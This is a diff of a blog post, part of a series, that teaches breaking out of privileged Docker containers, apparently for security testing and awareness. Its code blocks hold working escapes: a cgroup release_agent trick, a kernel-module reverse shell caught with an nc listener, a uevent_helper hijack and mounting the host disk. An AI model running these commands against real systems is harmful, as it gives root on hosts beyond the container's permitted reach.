@@ -16,14 +16,7 @@ This post is part of a series and shows container breakout techniques that can b
 The following posts are part of the series:
 - [Part 1: Access to root directory of the Host](../container-breakouts-part1)
 - Part 2: Privileged Container
-- Part 3: Docker Socket (not yet published)
-
-<!--
-The following posts are part of the series:
-- [Part 1: Access to root directory of the Host](../container-breakouts-part1)
-- Part 2: Privileged Container
 - [Part 3: Docker Socket](../container-breakouts-part3)
--->
 
 
 ## Intro
@@ -42,8 +35,8 @@ We will now explore two techniques that can be used to break out of the containe
 
 The available capabilities inside the container can be printed with the command `capsh --print`. The details about each capability can be taken from the man page (`man capavilities`). In case of a privileged container, all capabilities are available. An example output looks like following:
 
-```
-# capsh --print
+```bash	
+~# capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
 Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
 Securebits: 00/0x0/1'b0
@@ -56,7 +49,7 @@ groups=0(root)
 ```
 
 An alternative location to get details about the process capabilities can be taken from `/proc/self/status`, as following (thanks to [Chris le Roy](https://twitter.com/brompwnie) for one of the latest tweets):
-```
+```bash
 user@ca719daf3844:~$ grep Cap /proc/self/status
 CapInh:	0000003fffffffff
 CapPrm:	0000000000000000
@@ -85,20 +78,20 @@ Here is just the quintessence of this approach:
 
 The following commands are necessary to perform the attack:
 
-```
-# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/escape_cgroup
+```bash
+~# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/escape_cgroup
 
-# echo 1 > /tmp/cgrp/escape_cgroup/notify_on_release
-# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-# echo "$host_path/cmd" > /tmp/cgrp/release_agent
+~# echo 1 > /tmp/cgrp/escape_cgroup/notify_on_release
+~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+~# echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
-# echo '#!/bin/sh' > /cmd
-# echo "ps aux | /sbin/tee $host_path/cmdout" >> /cmd
-# chmod a+x /cmd
+~# echo '#!/bin/sh' > /cmd
+~# echo "ps aux | /sbin/tee $host_path/cmdout" >> /cmd
+~# chmod a+x /cmd
 
-# sh -c "echo 0 > /tmp/cgrp/escape_cgroup/cgroup.procs" 
-# sleep 1
-# head /cmdout
+~# sh -c "echo 0 > /tmp/cgrp/escape_cgroup/cgroup.procs" 
+~# sleep 1
+~# head /cmdout
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root           1  0.0  0.1 108272 11216 ?        Ss   20:57   0:00 /sbin/init
 root           2  0.0  0.0      0     0 ?        S    20:57   0:00 [kthreadd]
@@ -125,10 +118,10 @@ To **prepare** the **kernel module**, you **need** the **kernel headers** for th
 
 The following steps have been performed on a separate host (an ubuntu system).
 
-```
-# apt update && apt install -y gcc make linux-headers 
+```bash
+~# apt update && apt install -y gcc make linux-headers 
 
-# cat << EOF > reverse-shell.c
+~# cat << EOF > reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
 MODULE_LICENSE("GPL");
@@ -147,14 +140,14 @@ module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 EOF
 
-# cat Makefile
+~# cat Makefile
 obj-m +=reverse-shell.o
 all:
-make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 clean:
-make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
+	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
 
-# make
+~# make
 
 ```
 
@@ -162,23 +155,23 @@ After the **kernel module** is **prepared**, the binary is **transferred to** th
 
 **Terminal 1**
 
-```
-# nc -lvlp 1337
+```bash
+~# nc -lvlp 1337
 listening on [any] 1337 ...
 ```
 
 Terminal 1 must be on a system that is accessible from the host, that serves the container. The listener can even be started inside the container.  If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.
 
 **Terminal 2** 
-```
-# insmod reverse-shell.ko
+```bash
+~# insmod reverse-shell.ko
 ```
 And that’s it! 
 
 **Terminal 1**
 
-```
-# nc -lvlp 1337
+```bash
+~# nc -lvlp 1337
 listening on [any] 1337 ...
 
 172.17.0.1: inverse host lookup failed: Unknown host
@@ -201,21 +194,21 @@ An example to execute commands on the host system is as follows:
 2. Link “callback”
 3. Trigger “callback”
 
-```
-# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+```bash
+~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 
-# cat << EOF > /trigger.sh
+~# cat << EOF > /trigger.sh
 #!/bin/sh  
 ps auxf > $host_path/output.txt
 EOF
 
-# chmod +x /trigger.sh 
+~# chmod +x /trigger.sh 
 
-# echo $host_path/trigger.sh > /sys/kernel/uevent_helper
+~# echo $host_path/trigger.sh > /sys/kernel/uevent_helper
 
-# echo change > /sys/class/mem/null/uevent
+~# echo change > /sys/class/mem/null/uevent
 
-# head /output.txt
+~# head /output.txt
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root         2  0.0  0.0      0     0 ?        S    14:14   0:00 [kthreadd]
 root         3  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [kworker/0:0]
@@ -238,16 +231,16 @@ If you are in a privileged container, the devices are not striped and namespaced
 
 Mounting the hard drive is giving us access to the host filesystem. 
 
-```
+```bash
 root@0462216e684b:~# ls -l /dev/
 [...]
 brw-rw---- 1 root  994   8,   0 Jul 11 09:20 sda
 brw-rw---- 1 root  994   8,   1 Jul 11 09:20 sda1
 [...]
 
-# mkdir /hostfs
-# mount /dev/sda1 /hostfs
-# ls -l /hostfs/
+~# mkdir /hostfs
+~# mount /dev/sda1 /hostfs
+~# ls -l /hostfs/
 total 132
 lrwxrwxrwx   1 root root     7 Nov 19  2019 bin -> usr/bin
 drwxr-xr-x   4 root root  4096 May 13 13:29 boot
@@ -273,10 +266,6 @@ The main take away message is that one should **be careful if** a **container mu
 
 Now you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices.
 
-If you are interested in how to use the Docker socket to get out of the container, stay tuned for the next blog post of the series _**Part 3: Docker Socket**_.
-
-<!--
 If you are interested in how to use the Docker socket to get out of the container, continue with the next post [Part 3: Docker Socket](../container-breakouts-part3).
--->
 
 
